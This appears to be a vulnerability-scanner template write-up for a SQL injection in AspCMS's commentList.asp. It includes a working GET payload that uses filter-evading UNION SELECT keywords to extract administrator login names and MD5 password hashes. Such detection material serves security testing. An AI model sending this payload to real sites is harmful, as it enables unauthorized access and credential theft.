# Nuclei Template: AspCMS commentList.asp - SQL Injection
**Template ID:** aspcms-commentlist-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`aspcms-commentlist-sqli.yaml`)

## Vulnerability Information & PoC

## Description
An SQL injection vulnerability has been identified in the commentList.asp file of AspCMS. Exploiting this vulnerability, an attacker can illicitly acquire the administrator's MD5 password.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user
```

## References
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/cms/AspCMS/AspCMS%20commentList.asp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
